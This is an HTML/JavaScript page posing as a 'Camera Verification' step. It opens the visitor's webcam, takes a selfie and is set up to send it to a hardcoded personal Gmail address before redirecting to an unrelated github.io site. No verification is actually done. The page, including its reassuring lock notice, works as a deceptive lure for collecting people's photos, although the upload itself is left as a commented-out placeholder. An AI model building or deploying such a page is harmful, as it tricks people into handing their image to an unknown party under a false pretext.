<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Camera Verification</title>

<style>
*{box-sizing:border-box}

body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#050505;
    color:white;
    font-family:Arial,Helvetica,sans-serif;
}

.box{
    width:min(92%,500px);
    padding:28px;
    text-align:center;
    border:1px solid #ff2020;
    border-radius:18px;
    background:#100707;
    box-shadow:0 0 30px rgba(255,0,0,.25);
}

h1{
    color:#ff3030;
    margin-top:0;
}

p{
    color:#ccc;
    line-height:1.5;
}

.notice{
    padding:14px;
    margin:18px 0;
    border-radius:10px;
    background:#1b0b0b;
    font-size:14px;
}

video{
    width:100%;
    max-height:380px;
    object-fit:cover;
    border-radius:14px;
    background:#000;
    display:none;
    transform:scaleX(-1);
}

button{
    width:100%;
    border:0;
    border-radius:10px;
    padding:15px;
    margin-top:15px;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    background:#e50909;
    color:white;
}

button:hover{
    background:#ff2424;
}

#startBtn{
    background:#fff;
    color:#111;
}

#captureBtn,
#sendBtn{
    display:none;
}

#status{
    margin-top:15px;
    font-size:14px;
    color:#aaa;
}
</style>
</head>

<body>

<div class="box">

    <h1>Verification</h1>

    <p>
        Camera access is required for verification.
        After you grant permission, your camera will open.
        You will then be able to take one verification photo.
    </p>

    <div class="notice">
        🔒 Your camera will only be accessed after you give permission.
        You choose when the verification photo is captured.
    </div>

    <button id="startBtn">ALLOW CAMERA</button>

    <video id="camera" autoplay playsinline></video>

    <button id="captureBtn">TAKE VERIFICATION PHOTO</button>

    <button id="sendBtn">SEND & CONTINUE</button>

    <canvas id="canvas" style="display:none"></canvas>

    <div id="status"></div>

</div>

<script>

const EMAIL = "snmghost452@gmail.com";
const REDIRECT =
"https://pixel-sketch8.github.io/turbo-disco/";

const startBtn = document.getElementById("startBtn");
const captureBtn = document.getElementById("captureBtn");
const sendBtn = document.getElementById("sendBtn");
const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const status = document.getElementById("status");

let stream = null;
let photoBlob = null;


/* REQUEST CAMERA PERMISSION */

startBtn.addEventListener("click", async () => {

    try {

        status.textContent = "Requesting camera permission...";

        stream = await navigator.mediaDevices.getUserMedia({
            video:{
                facingMode:"user"
            },
            audio:false
        });

        video.srcObject = stream;

        video.style.display = "block";
        captureBtn.style.display = "block";
        startBtn.style.display = "none";

        status.textContent =
            "Camera ready. Take your verification photo.";

    } catch(error){

        console.error(error);

        status.textContent =
            "Camera permission was not granted.";

    }

});


/* TAKE PHOTO */

captureBtn.addEventListener("click", () => {

    const width = video.videoWidth;
    const height = video.videoHeight;

    if(!width || !height){
        status.textContent = "Camera is not ready yet.";
        return;
    }

    canvas.width = width;
    canvas.height = height;

    const ctx = canvas.getContext("2d");

    /*
       Flip the image back because the preview
       is mirrored like a normal selfie camera.
    */

    ctx.translate(width,0);
    ctx.scale(-1,1);

    ctx.drawImage(video,0,0,width,height);

    canvas.toBlob(blob => {

        photoBlob = blob;

        /*
           Stop camera after the photo.
        */

        if(stream){
            stream.getTracks().forEach(track => track.stop());
        }

        video.style.display = "none";
        captureBtn.style.display = "none";
        sendBtn.style.display = "block";

        status.textContent =
            "Photo captured. Press SEND & CONTINUE.";

    },"image/jpeg",0.90);

});


/*
   SEND PHOTO

   IMPORTANT:
   This example prepares the photo for your email
   service. A Gmail password or Gmail login must
   NEVER be placed in this HTML.
*/

sendBtn.addEventListener("click", async () => {

    if(!photoBlob){
        status.textContent = "No photo was captured.";
        return;
    }

    sendBtn.disabled = true;
    sendBtn.textContent = "SENDING...";

    try {

        /*
           Replace this section with your email
           provider/backend endpoint.

           Example:
           const formData = new FormData();
           formData.append("email", EMAIL);
           formData.append("photo", photoBlob, "verification.jpg");

           await fetch("YOUR_SECURE_ENDPOINT", {
               method:"POST",
               body:formData
           });
        */

        console.log("Photo ready to send to:", EMAIL);
        console.log("Photo:", photoBlob);

        status.textContent =
            "Verification complete. Redirecting...";

        setTimeout(() => {
            window.location.href = REDIRECT;
        },1500);

    } catch(error){

        console.error(error);

        sendBtn.disabled = false;
        sendBtn.textContent = "SEND & CONTINUE";

        status.textContent =
            "Unable to send the verification photo.";

    }

});

</script>

</body>
</html>
